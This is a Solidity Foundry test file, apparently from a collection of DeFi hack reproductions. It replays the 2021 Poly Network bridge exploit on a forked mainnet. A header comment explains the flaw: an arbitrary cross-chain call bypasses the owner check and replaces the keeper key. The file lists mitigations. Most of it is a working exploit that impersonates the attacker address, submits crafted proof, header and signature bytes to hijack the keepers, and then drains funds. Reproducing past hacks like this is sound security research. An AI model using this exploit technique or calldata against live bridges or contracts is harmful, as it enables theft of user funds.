// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
import {ECCUtils} from '../interfaces/PolyNetworkLibraries/ETHCrossChainUtils.sol';

// forge test --match-contract Exploit_PolyNetwork -vvv
/*
On Aug 10, 2021 an attacker stole ~611MM USD in various tokens from the Polynetwork Crosschain Bridge.

The attacker called the verifyHeaderAndExecuteTx function which performs an external call to an
arbitrary contract with _executeCrossChainTx targeting the bridge manager contract and bypassing the 
onlyOwner modifier (because the call came from an authorized contract) and changing the public key.

// Attack Overview
Total Lost: ~611MM USD
Attack Sign Tx: https://etherscan.io/tx/0xb1f70464bd95b774c6ce60fc706eb5f9e35cb5f06e6cfe7c17dcda46ffd59581/
Attack Loot Tx: Txhttps://etherscan.io/tx/0xad7a2c70c958fcd3effbf374d0acf3774a9257577625ae4c838e24b0de17602a

Exploited LockProxy: https://etherscan.io/address/0x250e76987d838a75310c34bf422ea9f1ac4cc906#code
Attacker Address: 0xC8a65Fadf0e0dDAf421F28FEAb69Bf6E2E589963
Attack Block:  12996659, 12996671 

// Key Info Sources
Writeup: https://rekt.news/polynetwork-rekt/
Article: https://research.kudelskisecurity.com/2021/08/12/the-poly-network-hack-explained/

Principle: Arbitrary External Calls, Access Control bypass by impersonation, function signature collision

    function verifyHeaderAndExecuteTx(
        bytes memory proof, 
        bytes memory rawHeader, 
        bytes memory headerProof, 
        bytes memory curRawHeader,
        bytes memory headerSig
        ) whenNotPaused public returns (bool){
            ...
            require(
                _executeCrossChainTx(
                    toContract, 
                    toMerkleValue.makeTxParam.method, 
                    toMerkleValue.makeTxParam.args,
                    toMerkleValue.makeTxParam.fromContract, 
                    toMerkleValue.fromChainID
                ), "Execute CrossChain Tx failed!");
            ...
        
            return true;
        }

    function _executeCrossChainTx(
        address _toContract, 
        bytes memory _method, 
        bytes memory _args, 
        bytes memory _fromContractAddr, 
        uint64 _fromChainId
        ) internal returns (bool){
        // Ensure the targeting contract gonna be invoked is indeed a contract rather than a normal account address
        require(Utils.isContract(_toContract), "The passed in address is not a contract!");
        bytes memory returnData;
        bool success;
        
        // The returnData will be bytes32, the last byte must be 01;
        (success, returnData) = _toContract.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, "(bytes,bytes,uint64)"))), abi.encode(_args, _fromContractAddr, _fromChainId)));
        
        // Ensure the executation is successful
        require(success == true, "EthCrossChain call business contract failed");
        
        // Ensure the returned value is true
        require(returnData.length != 0, "No return value from business contract!");
        (bool res,) = ZeroCopySource.NextBool(returnData, 31);
        require(res == true, "EthCrossChain call business contract return is not true");
        
        return true;
    }

ATTACK:
The attack has two main parts. First, the attacker modified the _method of the _executeCrossChainTx call in order to modify the keys of the manager contract.
Then, in control of the keys drained the pool.

MITIGATIONS:
1) Check the access control ownership between contracts of the same protocol and evaluate access control bypass vectors.
2) While having contracts where cross-chain relayed calls are performed, check if the destination of the calls could be maliciously manipulated. 

*/

interface IEthCrossChainManager {  
    function verifyHeaderAndExecuteTx(
        bytes memory proof, 
        bytes memory rawHeader, 
        bytes memory headerProof, 
        bytes memory curRawHeader,
        bytes memory headerSig
    ) external returns (bool);
}
contract Exploit_PolyNetwork is TestHarness, TokenBalanceTracker {
    IEthCrossChainManager internal bridge = IEthCrossChainManager(0x838bf9E95CB12Dd76a54C9f9D2E3082EAF928270);
    address internal attacker = 0xC8a65Fadf0e0dDAf421F28FEAb69Bf6E2E589963;
    function setUp() external {
        cheat.createSelectFork("mainnet", 12996658); // We pin one block before the attacker starts to drain the bridge after he sent the 0.1 WBTC tx on Moonbeam.
        updateBalanceTracker(attacker);
    }
    function test_attack() external {
        // deserializeProof();
        bytes memory proof = hex'af2080cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a0300000000000000200c28ffffaa7c5602285476ad860c54039782f8f20bd3677ba3d5250661ba71f708ea3100000000000014e1a18842891f8e82a5e6e5ad0a06d8448fe2f407020000000000000014cf2afe102057ba5c16f899271045a0a37fcb10f20b66313132313331383039331d010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b01362cad381a1e2432383300391908794fb71a2acd717d2f1565a40e7f8d36f9d5017b5baaca2a25e97f5afa40e98f87b0eca2eb0e9e7f24684d1b56db214aa51b3301ee1671b66cad1415453c0544d7e4425c1632e1b7dfdae3bd642ed7954e9f9b0d';
        bytes memory rawHeader = hex'0000000000000000000000008446719cbe62cf6fb9e3fb95a6c12882c5a3d885ad1dd8f2785e48d617d12708d38136a7df909f371a9f835d3ad58637e0dbc2f3e0f4bb60228730a46f77839a773046bcc14f6079db9033d0ab6176f171384070729fbfd2086a418e7e057717f3e67f4b67c999d13c258e5657f4dc0b5553e1836d0d81d1bff05b621053834bc7471261843aa80030451454a4f4b560fd13017b226c6561646572223a332c227672665f76616c7565223a22424851706a716f325767494d616a7a5a5a6c4158507951506c7a3357456e4a534e7470682b35416346376f37654b784e48486742704156724e54666f674c73485264394c7a544a5666666171787036734a637570324d303d222c227672665f70726f6f66223a226655346f56364462526d543264744d5254397a326b366853314f6f42584963397a72544956784974576348652f4b56594f2b58384f5167746143494d676139682f59615548564d514e554941326141484f664d545a773d3d222c226c6173745f636f6e6669675f626c6f636b5f6e756d223a31303938303030302c226e65775f636861696e5f636f6e666967223a6e756c6c7d0000000000000000000000000000000000000000';
        bytes memory headerSig = hex'7e3359dec445d7d49b80d9999ef2e34f01b6526f2a0b848fcb223201b21ced0e51bece6815510bf7283e98175c0bdfde8b5b1bdc38beef5e7b8ab1b8e8d1b2c900428e40826b3606e0b684d66e9406a5c0d69c16a5cbda8fefe176716f3286e872361ed29bd945b56d5af3a8c581d2b627f679061282f11a6e9b021fe3426faece00e09479bd3581f9eb27be273a761c509f6f20bde1c6a4187fa082c4e55b2f07684034b50075441c51cfc3061879bcf04e5a256b21379f67a2dc0643843bf6438000';

        cheat.prank(attacker);
        bridge.verifyHeaderAndExecuteTx(proof, rawHeader, '', '', headerSig);

        logBalancesWithLabel('Attacker before', attacker);
        bridge.verifyHeaderAndExecuteTx({
            proof: hex"b12094821f19c671e4c557c358d0780bd2030f3c909df3cb6933607077b9e57d89bd0a00000000000000010001001434d4a23a1fc0c694f0d74ddaf9d8d564cfe2d430020000000000000014250e76987d838a75310c34bf422ea9f1ac4cc90606756e6c6f636b4a14000000000000000000000000000000000000000014c8a65fadf0e0ddaf421f28feab69bf6e2e5899632662f145d8d496e79a0000000000000000000000000000000000000000000000", 
            // toContract: AssetProxy
            // method: 756e6c6f636b
            // args: 14000000000000000000000000000000000000000014c8a65fadf0e0ddaf421f28feab69bf6e2e5899632662f145d8d496e79a0000000000000000000000000000000000000000000000
            // struct TxArgs {
            //     bytes toAssetHash; 0000000000000000000000000000000000000000 // eth
            //     bytes toAddress; C8a65Fadf0e0dDAf421F28FEAb69Bf6E2E589963
            //     uint256 amount; 2662f145d8d496e79a0000000000000000000000000000000000000000000000 // 2857486346845890372134
            // }
            rawHeader: hex"00000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000afc014478ad573eaa072aaf625f990b01b1f0733b6070d2e38770f74c4d5fac900000000000000000000000000000000000000000000000000000000000000000000000000ca9a3b020000000000000001000000000000000000000000000000000000000000000000000000000000000000", 
            headerProof: hex"", 
            curRawHeader: hex"", 
            headerSig: hex"0c6539f57b9bd2138b003744d9bd94375111bd0137525073b5b3967b7089d98f47236cea76488260b74cb587dbbeb7c5f35a056a5cf5b63649cd90ff487f386401"
        });
        logBalancesWithLabel('Attacker after', attacker);
    }       

    function deserializeProof() public {
        // Calldata from call traces
        bytes memory proof = hex'af2080cc978479eb082e1e656993c63dee7a5d08a00dc2b2aab88bc0e465cfa0721a0300000000000000200c28ffffaa7c5602285476ad860c54039782f8f20bd3677ba3d5250661ba71f708ea3100000000000014e1a18842891f8e82a5e6e5ad0a06d8448fe2f407020000000000000014cf2afe102057ba5c16f899271045a0a37fcb10f20b66313132313331383039331d010000000000000014a87fb85a93ca072cd4e5f0d4f178bc831df8a00b01362cad381a1e2432383300391908794fb71a2acd717d2f1565a40e7f8d36f9d5017b5baaca2a25e97f5afa40e98f87b0eca2eb0e9e7f24684d1b56db214aa51b3301ee1671b66cad1415453c0544d7e4425c1632e1b7dfdae3bd642ed7954e9f9b0d';

        ECCUtils.ToMerkleValue memory toMerkleValue = ECCUtils.deserializeMerkleValue(proof);
        emit log_named_bytes('cross chain txHash', toMerkleValue.txHash);
        emit log_named_uint('fromChainID', toMerkleValue.fromChainID);

        emit log_named_bytes('source chain txHash', toMerkleValue.makeTxParam.txHash);
        emit log_named_bytes('crossChainId', toMerkleValue.makeTxParam.crossChainId);
        emit log_named_bytes('fromContract', toMerkleValue.makeTxParam.fromContract);
        emit log_named_uint('toChainID', toMerkleValue.makeTxParam.toChainId);
        emit log_named_bytes('toContract', toMerkleValue.makeTxParam.toContract);
        emit log_named_bytes('method', toMerkleValue.makeTxParam.method);
        emit log_named_bytes('args', toMerkleValue.makeTxParam.args);
    }

    function deserializeHeader() public {
        bytes memory rawHeader = hex'0000000000000000000000008446719cbe62cf6fb9e3fb95a6c12882c5a3d885ad1dd8f2785e48d617d12708d38136a7df909f371a9f835d3ad58637e0dbc2f3e0f4bb60228730a46f77839a773046bcc14f6079db9033d0ab6176f171384070729fbfd2086a418e7e057717f3e67f4b67c999d13c258e5657f4dc0b5553e1836d0d81d1bff05b621053834bc7471261843aa80030451454a4f4b560fd13017b226c6561646572223a332c227672665f76616c7565223a22424851706a716f325767494d616a7a5a5a6c4158507951506c7a3357456e4a534e7470682b35416346376f37654b784e48486742704156724e54666f674c73485264394c7a544a5666666171787036734a637570324d303d222c227672665f70726f6f66223a226655346f56364462526d543264744d5254397a326b366853314f6f42584963397a72544956784974576348652f4b56594f2b58384f5167746143494d676139682f59615548564d514e554941326141484f664d545a773d3d222c226c6173745f636f6e6669675f626c6f636b5f6e756d223a31303938303030302c226e65775f636861696e5f636f6e666967223a6e756c6c7d0000000000000000000000000000000000000000';
    }

}

contract Exploit_PolyNetwork_Deserializer is TestHarness, TokenBalanceTracker {

    function deseralizeProof(bytes memory _proof) public pure returns(ECCUtils.ToMerkleValue memory){
        ECCUtils.ToMerkleValue memory toMerkleValue = ECCUtils.deserializeMerkleValue(_proof);
        return toMerkleValue;
    }

    function deserializeHeader(bytes memory _header) public pure returns(ECCUtils.Header memory) {
        ECCUtils.Header memory header = ECCUtils.deserializeHeader(_header);
        return header;
    }

}